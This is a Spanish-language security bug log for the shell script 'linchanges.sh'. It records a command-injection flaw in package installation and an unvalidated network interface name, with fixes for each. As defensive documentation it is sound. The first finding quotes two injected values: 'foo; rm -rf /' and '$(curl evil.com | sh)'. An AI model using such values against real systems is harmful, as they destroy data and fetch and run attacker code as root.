# Bug Log — LinChanges

No se han encontrado vulnerabilidades ni bugs significativos en la revisión automatizada de seguridad del 2026-06-25 (Revisión 1).

---

## 2026-06-25 — Revisión 2 (Auditoría profesional completa)

### [HIGH] Inyección de argumento en instalación/eliminación de paquetes
- **Archivo:** `linchanges.sh` líneas 605, 621
- **Descripción:** El nombre de paquete introducido por el usuario se pasaba sin validar directamente a `apt-get install`, `dnf install`, `pacman -S` y `zypper install`. Un input como `foo; rm -rf /` o `$(curl evil.com | sh)` se ejecutaría con privilegios de root.
- **Fix:** Allowlist `^[a-zA-Z0-9_.+\-]+$` aplicada a `pkg_name` antes del bloque `case`. Error con mensaje en pantalla si el valor no cumple el patrón.

### [MEDIUM] Nombre de interfaz de red sin validación
- **Archivo:** `linchanges.sh` línea 778
- **Descripción:** El nombre de interfaz de red introducido por el usuario se pasaba directamente a `ip link set`, `dhclient` y `dhcpcd` sin comprobar que la interfaz existiera. Un valor arbitrario podría causar comportamiento inesperado o abuso de invocación.
- **Fix:** Comprobación `[[ -e "/sys/class/net/$iface" ]]` antes de operar sobre la interfaz. Si no existe, se muestra mensaje de error y se vuelve al menú.
